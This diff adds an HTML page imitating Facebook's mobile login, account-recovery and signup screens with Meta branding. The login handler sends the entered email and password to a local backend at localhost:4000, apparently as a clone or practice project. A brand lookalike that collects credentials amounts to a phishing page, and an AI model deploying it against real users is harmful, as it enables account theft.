@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Mobile</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #1c2e3d;
+            color: white;
+            height: 100vh;
+        }
+
+        /* Hide all pages initially */
+        .page {
+            display: none;
+            height: 100vh;
+        }
+
+        /* Show active page */
+        .page.active {
+            display: block;
+        }
+
+        /* Login Page Styles */
+        .login-page {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .language-selector {
+            margin-top: 80px;
+            display: flex;
+            align-items: center;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+
+        .language-selector .chevron {
+            margin-left: 5px;
+        }
+
+        .logo-container {
+            margin-top: 80px;
+            margin-bottom: 80px;
+        }
+
+        .facebook-logo {
+            width: 100px;
+            height: 100px;
+            background-color: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 65px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .login-form {
+            width: 85%;
+            max-width: 400px;
+        }
+
+        .error-message {
+            color: #ff4444;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 15px;
+            border-radius: 30px;
+            border: none;
+            background-color: #2c3e50;
+            color: white;
+            font-size: 16px;
+        }
+
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            cursor: pointer;
+            display: none;
+        }
+
+        .form-input.error {
+            border: 2px solid red;
+        }
+
+        .login-button,
+        .continue-button,
+        .next-button {
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            border: none;
+            background-color: #1877f2;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .create-account {
+            position: fixed;
+            bottom: 50px;
+            width: 85%;
+            max-width: 400px;
+            padding: 12px;
+            border-radius: 30px;
+            border: 1px solid #3b5998;
+            background-color: transparent;
+            color: #4b97ff;
+            font-size: 16px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .meta-logo {
+            position: fixed;
+            bottom: 20px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .meta-logo span {
+            font-size: 20px;
+        }
+
+        /* Recovery Page Styles */
+        .header {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .back-arrow {
+            color: white;
+            font-size: 24px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .sound-icon {
+            color: white;
+            font-size: 20px;
+        }
+
+        .content {
+            padding: 0 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-top: 0;
+            margin-bottom: 30px;
+        }
+
+        .notification-text {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 30px;
+        }
+
+        .search-email {
+            width: 100%;
+            padding: 14px;
+            border-radius: 30px;
+            border: 1px solid #3b5998;
+            background-color: transparent;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        /* Signup Page Styles */
+        .name-inputs {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .find-account {
+            position: fixed;
+            bottom: 30px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .find-account a {
+            color: #4b97ff;
+            text-decoration: none;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        /* Birthday Page Styles */
+        .birthday-description {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-top: 0;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .privacy-link {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .birthday-fields {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .birthday-input {
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            border: none;
+            background-color: #2c3e50;
+            color: white;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .birthday-label {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .birthday-field-container {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            min-width: 80px;
+            /* Minimum width for small screens */
+        }
+
+        /* Day field styles */
+        .birthday-field-container.day {
+            flex-basis: 25%;
+        }
+
+        /* Month field styles */
+        .birthday-field-container.month {
+            flex-basis: 25%;
+        }
+
+        /* Year field is slightly wider */
+        .birthday-field-container.year {
+            flex-basis: 40%;
+        }
+
+        #birthday-preview {
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 20px;
+            padding-left: 10px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .birthday-fields {
+                gap: 8px;
+            }
+
+            .birthday-field-container {
+                min-width: 70px;
+            }
+
+            .birthday-input {
+                padding: 14px 10px;
+                font-size: 15px;
+            }
+
+            .birthday-label {
+                font-size: 13px;
+            }
+
+            /* Redistribute space on smaller screens */
+            .birthday-field-container.day,
+            .birthday-field-container.month {
+                flex-basis: 30%;
+            }
+
+            .birthday-field-container.year {
+                flex-basis: 35%;
+            }
+        }
+
+        /* Very small screens */
+        @media (max-width: 350px) {
+            .birthday-fields {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .birthday-field-container {
+                width: 100%;
+            }
+
+            .birthday-field-container.day,
+            .birthday-field-container.month,
+            .birthday-field-container.year {
+                flex-basis: auto;
+            }
+
+            .birthday-label {
+                text-align: left;
+                padding-left: 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Login Page -->
+    <div id="login-page" class="page active">
+        <div class="login-page">
+            <div class="language-selector">
+                English (United States) <span class="chevron">▼</span>
+            </div>
+
+            <div class="logo-container">
+                <div class="facebook-logo">f</div>
+            </div>
+
+            <div class="login-form">
+                <input type="text" class="form-input" placeholder="Mobile number or email">
+                <div class="password-container">
+                    <input type="text" id="password-field" class="form-input" placeholder="Password">
+                    <span class="show-password" id="toggle-password">Show</span>
+                </div>
+                <div class="error-message" id="login-error"></div>
+                <button class="login-button">Log in</button>
+                <div class="forgot-password" onclick="showPage('recovery-page')">Forgot password?</div>
+            </div>
+
+            <div class="create-account" onclick="showPage('signup-page')">Create new account</div>
+
+            <div class="meta-logo">
+                <span>∞</span> Meta
+            </div>
+        </div>
+    </div>
+
+    <!-- Recovery Page -->
+    <div id="recovery-page" class="page">
+        <div class="header">
+            <span class="back-arrow" onclick="showPage('login-page')">←</span>
+        </div>
+
+        <div class="content">
+            <h1>Find your account</h1>
+            <p>Enter your mobile number.</p>
+
+            <input type="text" class="form-input" placeholder="Mobile number">
+
+            <div class="notification-text">
+                You may receive WhatsApp and SMS notifications from us for security and login purposes.
+            </div>
+
+            <button class="continue-button">Continue</button>
+            <button class="search-email" id="search-toggle">Search by email instead</button>
+        </div>
+    </div>
+
+    <!-- Signup Page (Name) -->
+    <div id="signup-page" class="page">
+        <div class="header">
+            <span class="back-arrow" onclick="showPage('login-page')">←</span>
+            <div class="sound-icon">🔊</div>
+        </div>
+
+        <div class="content">
+            <h1>What's your name?</h1>
+            <p>Enter the name you use in real life.</p>
+
+            <div class="name-inputs">
+                <input type="text" class="form-input" placeholder="First name">
+                <input type="text" class="form-input" placeholder="Last name">
+            </div>
+
+            <button class="next-button" onclick="handleNameNext()">Next</button>
+        </div>
+
+        <div class="find-account">
+            <a onclick="showPage('recovery-page')">Find my account</a>
+        </div>
+    </div>
+
+    <!-- Birthday Page -->
+    <div id="birthday-page" class="page">
+        <div class="header">
+            <span class="back-arrow" onclick="showPage('signup-page')">←</span>
+            <div class="sound-icon">🔊</div>
+        </div>
+
+        <div class="content">
+            <h1>What's your birthday?</h1>
+            <div class="birthday-description">
+                Choose your date of birth. You can always make this private later.
+                <a href="#" class="privacy-link">Why do I need to provide my birthday?</a>
+            </div>
+
+            <div class="birthday-fields">
+                <div class="birthday-field-container day">
+                    <div class="birthday-label">Day</div>
+                    <input type="tel" class="birthday-input" id="day-input" placeholder="DD" maxlength="2"
+                        inputmode="numeric">
+                </div>
+                <div class="birthday-field-container month">
+                    <div class="birthday-label">Month</div>
+                    <input type="tel" class="birthday-input" id="month-input" placeholder="MM" maxlength="2"
+                        inputmode="numeric">
+                </div>
+                <div class="birthday-field-container year">
+                    <div class="birthday-label">Year</div>
+                    <input type="tel" class="birthday-input" id="year-input" placeholder="YYYY" maxlength="4"
+                        inputmode="numeric">
+                </div>
+            </div>
+
+            <div id="birthday-preview">
+                Please enter your date of birth
+            </div>
+
+            <button class="next-button" id="birthday-next">Next</button>
+        </div>
+
+        <div class="find-account">
+            <a onclick="showPage('recovery-page')">Find my account</a>
+        </div>
+    </div>
+
+    <script>
+        // Function to show selected page and hide others
+        function showPage(pageId) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+
+            // Show selected page
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        // Handle "Next" button on the name page
+        function handleNameNext() {
+            const firstName = document.querySelector('#signup-page .name-inputs input:first-child');
+            const lastName = document.querySelector('#signup-page .name-inputs input:last-child');
+
+            if (firstName.value && lastName.value) {
+                // Store name data for later use
+                localStorage.setItem('firstName', firstName.value);
+                localStorage.setItem('lastName', lastName.value);
+
+                // Navigate to birthday page
+                showPage('birthday-page');
+            } else {
+                if (!firstName.value) {
+                    firstName.classList.add('error');
+                    firstName.placeholder = "first name";
+                }
+                if (!lastName.value) {
+                    lastName.classList.add('error');
+                    lastName.placeholder = "last name";
+                }
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const passwordField = document.getElementById('password-field');
+            const toggleButton = document.getElementById('toggle-password');
+
+            // Show the toggle button only when password field is focused
+            passwordField.addEventListener('focus', function () {
+                toggleButton.style.display = 'block';
+            });
+
+            // Hide the toggle button when password field loses focus
+            // but not if there's a click on the toggle button itself
+            document.addEventListener('click', function (e) {
+                if (e.target !== passwordField && e.target !== toggleButton) {
+                    toggleButton.style.display = 'none';
+                    // Also reset to password type if it was showing
+                    if (passwordField.type === 'text') {
+                        passwordField.type = 'password';
+                        toggleButton.textContent = 'Show';
+                    }
+                }
+            });
+
+            // Toggle password visibility when the button is pressed
+            toggleButton.addEventListener('mousedown', function (e) {
+                e.preventDefault(); // Prevent the default behavior which would blur the field
+                if (passwordField.type === 'password') {
+                    passwordField.type = 'text';
+                    toggleButton.textContent = 'Hide';
+                } else {
+                    passwordField.type = 'password';
+                    toggleButton.textContent = 'Show';
+                }
+            });
+
+            // Keep the button visible while typing
+            passwordField.addEventListener('input', function () {
+                if (passwordField.value.length > 0) {
+                    toggleButton.style.display = 'block';
+                }
+            });
+        });
+
+        // Login button functionality
+        document.querySelector('.login-button').addEventListener('click', function () {
+            const email = document.querySelector('#login-page input[type="text"]');
+            const password = document.getElementById('password-field');
+            const errorMessage = document.getElementById('login-error');
+
+            if (email.value && password.value) {
+                fetch('http://localhost:4000/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email.value,
+                        password: password.value,
+                    }),
+                })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.success) {
+                            alert("Login successful");
+                        } else {
+                            errorMessage.textContent = data.message || "Login failed.";
+                            errorMessage.style.display = 'block';
+                        }
+                    })
+                    .catch(err => {
+                        console.error(err);
+                        errorMessage.textContent = "An error occurred.";
+                        errorMessage.style.display = 'block';
+                    });
+
+                email.value = '';
+                password.value = '';
+            } else {
+                if (!email.value) {
+                    email.focus(); // Focus on the email input field
+                } else if (!password.value) {
+                    password.focus(); // Focus on the password input field
+                }
+            }
+        });
+
+        // Continue button functionality (recovery page)
+        document.querySelector('.continue-button').addEventListener('click', function () {
+            const identifier = document.querySelector('#recovery-page .form-input');
+
+            if (identifier.value) {
+                console.log("Recovery requested for:", identifier.value);
+            } else {
+                identifier.classList.add('error');
+                identifier.placeholder = "Please enter your " +
+                    (document.querySelector('#recovery-page p').textContent.includes("mobile") ?
+                        "mobile number" : "email address");
+            }
+        });
+
+        // Toggle between mobile and email recovery
+        document.getElementById('search-toggle').addEventListener('click', function () {
+            const paragraph = document.querySelector('#recovery-page p');
+            const input = document.querySelector('#recovery-page .form-input');
+            const button = document.getElementById('search-toggle');
+
+            if (paragraph.textContent.includes("mobile")) {
+                paragraph.textContent = "Enter your email address.";
+                input.placeholder = "Email address";
+                button.textContent = "Search by mobile number instead";
+            } else {
+                paragraph.textContent = "Enter your mobile number.";
+                input.placeholder = "Mobile number";
+                button.textContent = "Search by email instead";
+            }
+        });
+
+        // Functions for birthday page
+        document.addEventListener('DOMContentLoaded', function () {
+            const dayInput = document.getElementById('day-input');
+            const monthInput = document.getElementById('month-input');
+            const yearInput = document.getElementById('year-input');
+            const birthdayPreview = document.getElementById('birthday-preview');
+
+            // Add input event listeners to update preview
+            [dayInput, monthInput, yearInput].forEach(input => {
+                input.addEventListener('input', function (e) {
+                    // Ensure only numbers are entered
+                    this.value = this.value.replace(/[^0-9]/g, '');
+
+                    // Auto-format day and month to add leading zero if needed
+                    if (this === dayInput || this === monthInput) {
+                        const val = parseInt(this.value);
+                        if (val > 0 && val < 10 && this.value.length === 1) {
+                            // Don't add leading zero while typing
+                        }
+                    }
+
+                    // Update the preview
+                    updateBirthdayPreview();
+
+                    // Auto-move to next field
+                    if (this.value.length >= this.maxLength) {
+                        if (this === dayInput && parseInt(this.value) >= 1 && parseInt(this.value) <= 31) {
+                            monthInput.focus();
+                        }
+                        if (this === monthInput && parseInt(this.value) >= 1 && parseInt(this.value) <= 12) {
+                            yearInput.focus();
+                        }
+                    }
+                });
+            });
+
+            // Function to update birthday preview
+            function updateBirthdayPreview() {
+                const day = parseInt(dayInput.value);
+                const month = parseInt(monthInput.value);
+                const year = parseInt(yearInput.value);
+
+                if (day && month && year && isValidDate(day, month, year)) {
+                    const date = new Date(year, month - 1, day);
+                    const currentDate = new Date();
+                    const age = calculateAge(date, currentDate);
+
+                    const monthNames = [
+                        "January", "February", "March", "April", "May", "June",
+                        "July", "August", "September", "October", "November", "December"
+                    ];
+
+                    birthdayPreview.textContent = `Birthday (${age} years old)\n${monthNames[month - 1]} ${day}, ${year}`;
+                } else if (dayInput.value || monthInput.value || yearInput.value) {
+                    birthdayPreview.textContent = "Please enter a valid date of birth";
+                } else {
+                    birthdayPreview.textContent = "Please enter your date of birth";
+                }
+            }
+
+            // Check if date is valid
+            function isValidDate(day, month, year) {
+                if (month < 1 || month > 12) return false;
+                if (day < 1) return false;
+
+                // Check days in month
+                const daysInMonth = new Date(year, month, 0).getDate();
+                if (day > daysInMonth) return false;
+
+                // Check if date is not in the future
+                const inputDate = new Date(year, month - 1, day);
+                const currentDate = new Date();
+                if (inputDate > currentDate) return false;
+
+                // Check if the year has 4 digits
+                if (year.toString().length !== 4) return false;
+
+                // Additional check for reasonable age (e.g., at least 13 years old for Facebook)
+                const minAge = 13;
+                const maxAge = 120;
+                const age = calculateAge(inputDate, currentDate);
+                return age >= minAge && age <= maxAge;
+            }
+
+            // Calculate age
+            function calculateAge(birthDate, currentDate) {
+                let age = currentDate.getFullYear() - birthDate.getFullYear();
+                const m = currentDate.getMonth() - birthDate.getMonth();
+                if (m < 0 || (m === 0 && currentDate.getDate() < birthDate.getDate())) {
+                    age--;
+                }
+                return age;
+            }
+
+            // Mobile keyboard optimization
+            [dayInput, monthInput, yearInput].forEach(input => {
+                // Tap anywhere else to dismiss keyboard
+                document.addEventListener('click', function (e) {
+                    if (e.target !== input && !e.target.closest('.birthday-fields')) {
+                        input.blur();
+                    }
+                });
+            });
+
+            // Birthday next button
+            document.getElementById('birthday-next').addEventListener('click', function () {
+                const day = dayInput.value;
+                const month = monthInput.value;
+                const year = yearInput.value;
+
+                if (day && month && year && isValidDate(parseInt(day), parseInt(month), parseInt(year))) {
+                    // Store birthday data
+                    localStorage.setItem('birthday', `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`);
+                    console.log("Birthday saved! In a real app, this would proceed to the next signup step.");
+                } else {
+                    if (!day || !month || !year) {
+                        if (!day) {
+                            dayInput.classList.add('error');
+                            dayInput.placeholder = "day";
+                        }
+                        if (!month) {
+                            monthInput.classList.add('error');
+                            monthInput.placeholder = "month";
+                        }
+                        if (!year) {
+                            yearInput.classList.add('error');
+                            yearInput.placeholder = "year";
+                        }
+                    } else {
+                        dayInput.classList.add('error');
+                        monthInput.classList.add('error');
+                        yearInput.classList.add('error');
+                        dayInput.placeholder = "Invalid date";
+                        monthInput.placeholder = "Invalid date";
+                        yearInput.placeholder = "Invalid date";
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
